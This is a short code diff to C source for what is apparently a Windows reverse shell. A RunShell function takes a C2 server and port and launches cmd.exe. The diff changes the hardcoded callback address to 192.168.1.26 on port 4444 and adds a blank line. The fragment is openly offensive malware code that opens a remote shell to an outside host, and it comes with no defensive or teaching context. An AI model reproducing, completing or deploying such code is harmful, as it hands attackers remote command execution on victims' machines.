@@ -98,6 +98,7 @@ void RunShell(char* C2Server, int C2Port) {
 
             char Process[] = "cmd.exe";
             STARTUPINFO sinfo;
+
             PROCESS_INFORMATION pinfo;
             memset(&sinfo, 0, sizeof(sinfo));
             sinfo.cb = sizeof(sinfo);
@@ -119,7 +120,7 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "10.0.40.198";
+        char host[] = "192.168.1.26";
         int port = 4444;
         RunShell(host, port);
     }
